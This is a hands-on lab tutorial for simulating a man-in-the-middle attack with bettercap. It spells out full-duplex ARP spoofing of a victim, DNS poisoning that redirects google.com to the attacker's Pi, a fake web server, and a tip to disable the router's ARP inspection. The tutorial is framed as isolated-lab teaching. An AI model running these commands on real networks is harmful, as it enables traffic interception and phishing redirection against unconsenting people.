# Summary

Simulate a Man-in-the-Middle (MITM) attack using ARP spoofing and DNS poisoning in an isolated lab environment. This demonstrates how attackers can intercept traffic and redirect DNS queries to malicious servers.

# Process

### Lab Setup

**Requirements:**

- A Raspberry Pi with Kali Linux installed and dependencies (bettercap) installed.

### Part A: ARP Spoofing

**Step 1.** Launch Bettercap on your network interface:

```bash
sudo bettercap -iface wlan0
```

Replace `wlan0` with your actual interface — use `eth0` for Ethernet.

💡 From this step on, you should run everything inside bettercap. This means you should see a **constant yellow highlight** in your terminal.

---

#### Gateway Spoof (Victim ↔ Router/Internet)

**Step 2.** Inside Bettercap, probe the network to discover devices:

```jsx
net.probe on

```

**Step 3.** Note the Victim's IP and router's IP from the output, OR get the victim's IP from a command on the victim device.

**Step 4.** Set the ARP spoof target and enable **full-duplex mode**:

```
set arp.spoof.targets <VICTIM_IP>
set arp.spoof.fullduplex true
arp.spoof on
```

💡 **Full-duplex mode** spoofs BOTH directions:

- Tells the **Victim** that the attacker is the router
- Tells the **Router** that the attacker is the victim

This ensures you intercept traffic going TO and FROM the victim.

---

### Part B: DNS Poisoning

**Step 5.** With ARP spoof active, configure DNS spoofing to redirect specific domains to the attacker. In the Bettercap prompt:

```
set dns.spoof.ttl 300
set dns.spoof.domains google.com
set dns.spoof.address <ATTACKER_IP>
dns.spoof on
```

Replace `<ATTACKER_IP>` with the attacker Pi's IP address.

⚠️ **dns.spoof.ttl 300** sets the TTL to 300 seconds. The default (1024 seconds) causes spoofed DNS entries to persist on the victim long after you stop the attack. A low TTL ensures the victim's cache expires quickly during cleanup.
💡 **set dns.spoof.domains google.com** prevents the victim from accessing google. If you want to spoof more than one domain, add the domains and separate them with commas.

### Part C: (Optional) Fake Server

**Step 6.** (Optional) Start a fake web server on the attacker to serve a landing page:

```bash
python3 -m http.server 80
```

---

### Verification on Victim Pi

**Step 7.** On the Victim Pi, verify the ARP table shows the router's IP mapped to the **attacker's MAC address**:

```bash
arp -a
```

**Step 8.** Test DNS resolution — it should return the attacker's IP:

```bash
nslookup testsite.local
```

**Step 9.** Open a browser and navigate to [`](http://testsite.local)http://testsite.local` — you should see the attacker's fake page.

---

### Cleanup — Restore Attacker Pi to Normal

**Step 10.** Stop Bettercap modules (inside Bettercap prompt):

```
dns.spoof off
arp.spoof off
exit
```

**Step 11.** Disable IP forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

**Step 12.** (Optional) Remove installed packages to fully restore the system:

```bash
sudo apt remove --purge -y bettercap libpcap-dev libnetfilter-queue-dev
sudo apt autoremove -y
sudo apt clean
```

**Step 13.** Verify IP forwarding is disabled (should return `0`):

```bash
cat /proc/sys/net/ipv4/ip_forward
```

---

# Troubleshooting

### ARP spoof not working

- **Router has Dynamic ARP Inspection (DAI):** Some routers have anti-spoofing features. Disable DAI in router settings for the lab, or use a dumb switch.
- **Static ARP entries:** If the victim has static ARP entries, the spoof won't override them.

### DNS spoof not taking effect

- **DNS cache on victim:** The victim may have cached the real DNS entry. Flush the cache:
    - Linux: `sudo systemd-resolve --flush-caches`
    - Or wait for TTL to expire.
- **ARP spoof not active:** DNS spoof requires ARP spoof to be running first — queries must route through you.

### HTTPS sites show certificate errors

- **Expected behavior.** HTTPS + HSTS prevents spoofing of major sites. Your fake server doesn't have a valid certificate. This attack is only effective against HTTP traffic or users who click through warnings.

### Syntax issues with [dns.spoof.domains](http://dns.spoof.domains)

- Use no spaces after commas: `site1.local,site2.local` not `site1.local, site2.local`

---

# Extra Notes

**Official Bettercap Documentation:**

- ARP Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
- DNS Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/

**Ethical Warning:** This simulation must only be performed on hardware you own and on a private, isolated network. Intercepting traffic on public or unauthorized networks is illegal.

**Alternative:** For a software-only simulation without physical hardware, use GNS3 to virtualize the entire network.
